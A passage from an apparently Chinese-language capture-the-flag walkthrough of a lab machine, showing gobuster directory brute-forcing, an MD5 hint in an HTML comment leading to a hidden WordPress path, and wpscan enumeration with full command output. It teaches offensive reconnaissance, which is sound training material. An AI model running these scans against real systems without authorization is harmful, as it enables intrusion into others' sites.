-</span></span><span style=display:flex><span>&lt;/body&gt;&lt;/html&gt;</span></span></code></pre></div><p>目标站点不存在robots.txt文件，接着进行目录扫描：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>└─$ gobuster dir -u http://192.168.242.230 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span>Gobuster v3.8
-</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#ff6ac1>(</span>@TheColonial<span style=color:#ff6ac1>)</span> &amp; Christian Mehlmauer <span style=color:#ff6ac1>(</span>@firefart<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Url:                     http://192.168.242.230
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Method:                  GET
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Threads:                 <span style=color:#ff9f43>10</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Negative Status codes:   <span style=color:#ff9f43>404</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> User Agent:              gobuster/3.8
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Timeout:                 <span style=color:#ff5c57>10s</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span>Starting gobuster in directory enumeration <span style=color:#ff5c57>mode</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span>/javascript           <span style=color:#ff6ac1>(</span>Status: 301<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 323<span style=color:#ff6ac1>]</span> <span style=color:#ff6ac1>[</span>--&gt; http://192.168.242.230/javascript/<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>/phpmyadmin           <span style=color:#ff6ac1>(</span>Status: 301<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 323<span style=color:#ff6ac1>]</span> <span style=color:#ff6ac1>[</span>--&gt; http://192.168.242.230/phpmyadmin/<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>/server-status        <span style=color:#ff6ac1>(</span>Status: 403<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 280<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>Progress: <span style=color:#ff9f43>220558</span> / <span style=color:#ff9f43>220558</span> <span style=color:#ff6ac1>(</span>100.00%<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span><span style=color:#ff5c57>Finished</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span></span></span></code></pre></div><ul><li><code>gobuster</code>是一个Go语言编写的高性能目录爆破工具，<code>dir</code>是目录扫描模式(枚举web服务器山过多隐藏目录、文件，向目标web服务器发送HTTP/HTTPS请求，接收服务器响应码判断目录/文件是否存在)，<code>-u</code>指定URL，<code>-w</code>(&ndash;wordlist)指定字典路径</li><li>gobuster工具扫描出/javascript、/phpmyadmin目录</li></ul><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>└─$ gobuster dir -u http://192.168.242.230 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.sh,.html
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span>Gobuster v3.8
-</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#ff6ac1>(</span>@TheColonial<span style=color:#ff6ac1>)</span> &amp; Christian Mehlmauer <span style=color:#ff6ac1>(</span>@firefart<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Url:                     http://192.168.242.230
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Method:                  GET
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Threads:                 <span style=color:#ff9f43>10</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Negative Status codes:   <span style=color:#ff9f43>404</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> User Agent:              gobuster/3.8
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Extensions:              txt,sh,html,php
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Timeout:                 <span style=color:#ff5c57>10s</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span>Starting gobuster in directory enumeration <span style=color:#ff5c57>mode</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span>/index.html           <span style=color:#ff6ac1>(</span>Status: 200<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 10918<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>/index.php            <span style=color:#ff6ac1>(</span>Status: 200<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 271<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>/javascript           <span style=color:#ff6ac1>(</span>Status: 301<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 323<span style=color:#ff6ac1>]</span> <span style=color:#ff6ac1>[</span>--&gt; http://192.168.242.230/javascript/<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>/phpmyadmin           <span style=color:#ff6ac1>(</span>Status: 301<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 323<span style=color:#ff6ac1>]</span> <span style=color:#ff6ac1>[</span>--&gt; http://192.168.242.230/phpmyadmin/<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>/phpinfo.php          <span style=color:#ff6ac1>(</span>Status: 200<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 95447<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>/server-status        <span style=color:#ff6ac1>(</span>Status: 403<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 280<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>Progress: <span style=color:#ff9f43>1102790</span> / <span style=color:#ff9f43>1102790</span> <span style=color:#ff6ac1>(</span>100.00%<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span><span style=color:#ff5c57>Finished</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span></span></span></code></pre></div><ul><li><p><code>-x .php,.txt,.sh,.html</code>(-x全写是&ndash;extensions)这条命令拿着<code>directory-list-2.3-medium.txt</code>字典逐一尝试访问靶机，并给每个词条加上<code>.php</code>、<code>.txt</code>、<code>.sh</code>、<code>.html</code>后缀，如字典里的<code>admin</code>，会同时尝试<code>http://192.168.242.230/admin.php</code>、<code>http://192.168.242.230/admin.txt</code>、<code>http://192.168.242.230/admin.sh</code>、<code>http://192.168.242.230/admin.html</code></p></li><li><p>状态码：200代表成功找到这个文件or页面，访问，如：<code>http://192.168.242.230/index.html</code>；301/302代表重定向，通常是真实存在的文件夹，可以访问；403被禁止，有权限看，但服务器不让进，记录下来，通常有敏感内容，需要后续绕过</p></li><li><p>URL后缀加上<code>/index.php</code>，再F12查看页面源代码</p></li></ul><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-HTML data-lang=HTML><span style=display:flex><span>&lt;<span style=color:#ff6ac1>html</span>&gt;&lt;<span style=color:#ff6ac1>head</span>&gt;
-</span></span><span style=display:flex><span>&lt;<span style=color:#ff6ac1>title</span>&gt;404 Not Found&lt;/<span style=color:#ff6ac1>title</span>&gt;
-</span></span><span style=display:flex><span>&lt;/<span style=color:#ff6ac1>head</span>&gt;&lt;<span style=color:#ff6ac1>body</span>&gt;
-</span></span><span style=display:flex><span>&lt;<span style=color:#ff6ac1>h1</span>&gt;Not Found&lt;/<span style=color:#ff6ac1>h1</span>&gt;
-</span></span><span style=display:flex><span><span style=color:#78787e>&lt;!--My heart was encrypted, &#34;beelzebub&#34; somehow hacked and decoded it.-md5--&gt;</span>
-</span></span><span style=display:flex><span>&lt;<span style=color:#ff6ac1>p</span>&gt;The requested URL was not found on this server.&lt;/<span style=color:#ff6ac1>p</span>&gt;
-</span></span><span style=display:flex><span>&lt;<span style=color:#ff6ac1>hr</span>&gt;
-</span></span><span style=display:flex><span>&lt;<span style=color:#ff6ac1>address</span>&gt;Apache/2.4.30 (Ubuntu)&lt;/<span style=color:#ff6ac1>address</span>&gt;
-</span></span><span style=display:flex><span>&lt;/<span style=color:#ff6ac1>body</span>&gt;&lt;/<span style=color:#ff6ac1>html</span>&gt;</span></span></code></pre></div><p>根据HTML注释中提示，提及了beelzebub和md5，暗示需要对beelzebub这个字符串进行MD5哈希加密</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>└─$ <span style=color:#ff5c57>echo</span> -n <span style=color:#5af78e>&#39;beelzebub&#39;</span> | md5sum
-</span></span><span style=display:flex><span>d18e1e22becbd915b45e0e655429d487  -
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>└─$ man <span style=color:#ff5c57>echo</span> | grep -e <span style=color:#5af78e>&#39;-n&#39;</span>
-</span></span><span style=display:flex><span>       -n     <span style=color:#ff6ac1>do</span> not output the trailing newline</span></span></code></pre></div><ul><li><code>-n</code>()确保计算的是纯粹的字符串<code>beelzebub</code>的哈希值，若不加，则echo在字符串末尾添加一个不可见的换行符，即计算的是<code>beelzebub\n</code>的哈希值</li><li>再用<code>man</code>(manual)手册查证细节，验证不产生换行符，<code>|</code>管道符串联前后命令，传递输出作为输入，<code>grep</code>是文本筛选工具，<code>-e</code>指定后续为匹配模式</li><li>将该值作为目标继续扫描</li></ul><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>└─$ gobuster dir -u http://192.168.242.230/d18e1e22becbd915b45e0e655429d487 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span>Gobuster v3.8
-</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#ff6ac1>(</span>@TheColonial<span style=color:#ff6ac1>)</span> &amp; Christian Mehlmauer <span style=color:#ff6ac1>(</span>@firefart<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Url:                     http://192.168.242.230/d18e1e22becbd915b45e0e655429d487
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Method:                  GET
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Threads:                 <span style=color:#ff9f43>10</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Negative Status codes:   <span style=color:#ff9f43>404</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> User Agent:              gobuster/3.8
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Timeout:                 <span style=color:#ff5c57>10s</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span>Starting gobuster in directory enumeration <span style=color:#ff5c57>mode</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span>/wp-content           <span style=color:#ff6ac1>(</span>Status: 301<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 356<span style=color:#ff6ac1>]</span> <span style=color:#ff6ac1>[</span>--&gt; http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-content/<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>/wp-includes          <span style=color:#ff6ac1>(</span>Status: 301<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 357<span style=color:#ff6ac1>]</span> <span style=color:#ff6ac1>[</span>--&gt; http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-includes/<span style=color:#ff6ac1>]</span>                                                                                                                        
-</span></span><span style=display:flex><span>/wp-admin             <span style=color:#ff6ac1>(</span>Status: 301<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 354<span style=color:#ff6ac1>]</span> <span style=color:#ff6ac1>[</span>--&gt; http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-admin/<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>Progress: <span style=color:#ff9f43>220558</span> / <span style=color:#ff9f43>220558</span> <span style=color:#ff6ac1>(</span>100.00%<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
-</span></span><span style=display:flex><span><span style=color:#ff5c57>Finished</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span></span></span></code></pre></div><ul><li>此时扫描出wordpress(WP)目录，说明在隐藏的MD5目录下，运行着一个完整的WordPress网站</li><li>接下来看是否可用wpscan扫描出用户名或者插件</li></ul><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>└─$ wpscan --url http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/ -e u,p
-</span></span><span style=display:flex><span>_______________________________________________________________
-</span></span><span style=display:flex><span>         __          _______   _____
-</span></span><span style=display:flex><span>         <span style=color:#5af78e>\ \ </span>       / /  __ <span style=color:#5af78e>\ </span>/ ____|
-</span></span><span style=display:flex><span>          <span style=color:#5af78e>\ \ </span> /<span style=color:#5af78e>\ </span> / /| |__<span style=color:#ff6ac1>)</span> | <span style=color:#ff6ac1>(</span>___   ___  __ _ _ __ ®
-</span></span><span style=display:flex><span>           <span style=color:#5af78e>\ \/</span>  <span style=color:#5af78e>\/</span> / |  ___/ <span style=color:#5af78e>\_</span>__ <span style=color:#5af78e>\ </span>/ __|/ _<span style=color:#5af78e>`</span> | <span style=color:#ff5c57>&#39;</span>_ <span style=color:#5af78e>\
-</span></span></span><span style=display:flex><span>            <span style=color:#5af78e>\ </span> /<span style=color:#5af78e>\ </span> /  | |     ____<span style=color:#ff6ac1>)</span> | <span style=color:#ff6ac1>(</span>__| <span style=color:#ff6ac1>(</span>_| | | | |
-</span></span><span style=display:flex><span>             <span style=color:#5af78e>\/</span>  <span style=color:#5af78e>\/</span>   |_|    |_____/ <span style=color:#5af78e>\_</span>__|<span style=color:#5af78e>\_</span>_,_|_| |_|
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>         WordPress Security Scanner by the WPScan Team
-</span></span><span style=display:flex><span>                         Version 3.8.28
-</span></span><span style=display:flex><span>                               
-</span></span><span style=display:flex><span>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-</span></span><span style=display:flex><span>_______________________________________________________________
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>i<span style=color:#ff6ac1>]</span> Updating the Database ...
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>i<span style=color:#ff6ac1>]</span> Update completed.
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Scan Aborted: The URL supplied redirects to http://192.168.1.6/d18e1e22becbd915b45e0e655429d487/. Use the --ignore-main-redirect option to ignore the redirection and scan the target, or change the --url option value to the redirected URL.</span></span></code></pre></div><p><code>-e</code>(&ndash;enumerate)，<code>u,p</code>(users,plugins)。WPScan报错，由于WordPress内部配置的Site URL与当前访问的IP不一致，目标服务器试图将我重定向到坐着原始环境的IP（<code>192.168.1.6</code>）,导致扫描中断，修改命令再尝试</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>└─$ wpscan --url http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/ -e --plugins-detection aggressive --ignore-main-redirect --force
-</span></span><span style=display:flex><span>w_______________________________________________________________
-</span></span><span style=display:flex><span>         __          _______   _____
-</span></span><span style=display:flex><span>         <span style=color:#5af78e>\ \ </span>       / /  __ <span style=color:#5af78e>\ </span>/ ____|
-</span></span><span style=display:flex><span>          <span style=color:#5af78e>\ \ </span> /<span style=color:#5af78e>\ </span> / /| |__<span style=color:#ff6ac1>)</span> | <span style=color:#ff6ac1>(</span>___   ___  __ _ _ __ ®
-</span></span><span style=display:flex><span>           <span style=color:#5af78e>\ \/</span>  <span style=color:#5af78e>\/</span> / |  ___/ <span style=color:#5af78e>\_</span>__ <span style=color:#5af78e>\ </span>/ __|/ _<span style=color:#5af78e>`</span> | <span style=color:#5af78e>&#39;_ \
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>            \  /\  /  | |     ____) | (__| (_| | | | |
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>         WordPress Security Scanner by the WPScan Team
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>                         Version 3.8.28
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>       Sponsored by Automattic - https://automattic.com/
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>_______________________________________________________________
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>[+] URL: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/ [192.168.242.230]
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>[+] Started: Mon Jan 19 00:50:56 2026
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>Interesting Finding(s):
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>[+] Headers
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Interesting Entries:
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> |  - Server: Apache/2.4.29 (Ubuntu)
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> |  - X-Redirect-By: WordPress
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Found By: Headers (Passive Detection)
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Confidence: 100%
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>[+] XML-RPC seems to be enabled: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/xmlrpc.php
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Found By: Direct Access (Aggressive Detection)
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Confidence: 100%
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | References:
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>[+] WordPress readme found: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/readme.html
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Found By: Direct Access (Aggressive Detection)
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Confidence: 100%
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>[+] Upload directory has listing enabled: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Found By: Direct Access (Aggressive Detection)
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Confidence: 100%
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>[+] The external WP-Cron seems to be enabled: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-cron.php
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Found By: Direct Access (Aggressive Detection)
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Confidence: 60%
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | References:
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> |  - https://www.iplocation.net/defend-wordpress-from-ddos
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> |  - https://github.com/wpscanteam/wpscan/issues/1299
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>
-</span></span></span><span style=display:flex><span><span style=color:#5af78e>[+] WordPress version 5.3.6 identified (Insecure, released on 2020-10-30).
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Found By: Atom Generator (Aggressive Detection)
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> |  - http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/index.php/feed/atom/, &lt;generator uri=&#34;https://wordpress.org/&#34; version=&#34;5.3.6&#34;&gt;WordPress&lt;/generator&gt;
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> | Confirmed By: Style Etag (Aggressive Detection)
-</span></span></span><span style=display:flex><span><span style=color:#5af78e> |  - http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-admin/load-styles.php, Match: &#39;</span>5.3.6<span style=color:#ff5c57>&#39;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>i<span style=color:#ff6ac1>]</span> The main theme could not be detected.
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Enumerating Vulnerable Plugins <span style=color:#ff6ac1>(</span>via Aggressive Methods<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span> Checking Known Locations - Time: 00:00:28 &lt;<span style=color:#ff6ac1>=======================================</span>&gt; <span style=color:#ff6ac1>(</span><span style=color:#ff9f43>7343</span> / 7343<span style=color:#ff6ac1>)</span> 100.00% Time: 00:00:28
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>i<span style=color:#ff6ac1>]</span> No plugins Found.
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Enumerating Vulnerable Themes <span style=color:#ff6ac1>(</span>via Passive and Aggressive Methods<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span> Checking Known Locations - Time: 00:00:00 &lt;<span style=color:#ff6ac1>=========================================</span>&gt; <span style=color:#ff6ac1>(</span><span style=color:#ff9f43>652</span> / 652<span style=color:#ff6ac1>)</span> 100.00% Time: 00:00:00
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>i<span style=color:#ff6ac1>]</span> No themes Found.
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Enumerating Timthumbs <span style=color:#ff6ac1>(</span>via Passive and Aggressive Methods<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span> Checking Known Locations - Time: 00:00:02 &lt;<span style=color:#ff6ac1>=======================================</span>&gt; <span style=color:#ff6ac1>(</span><span style=color:#ff9f43>2568</span> / 2568<span style=color:#ff6ac1>)</span> 100.00% Time: 00:00:02
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>i<span style=color:#ff6ac1>]</span> No Timthumbs Found.
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Enumerating Config Backups <span style=color:#ff6ac1>(</span>via Passive and Aggressive Methods<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span> Checking Config Backups - Time: 00:00:00 &lt;<span style=color:#ff6ac1>==========================================</span>&gt; <span style=color:#ff6ac1>(</span><span style=color:#ff9f43>137</span> / 137<span style=color:#ff6ac1>)</span> 100.00% Time: 00:00:00
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>i<span style=color:#ff6ac1>]</span> No Config Backups Found.
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Enumerating DB Exports <span style=color:#ff6ac1>(</span>via Passive and Aggressive Methods<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span> Checking DB Exports - Time: 00:00:00 &lt;<span style=color:#ff6ac1>================================================</span>&gt; <span style=color:#ff6ac1>(</span><span style=color:#ff9f43>75</span> / 75<span style=color:#ff6ac1>)</span> 100.00% Time: 00:00:00
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>i<span style=color:#ff6ac1>]</span> No DB Exports Found.
-</span></span><span style=display:flex><span>
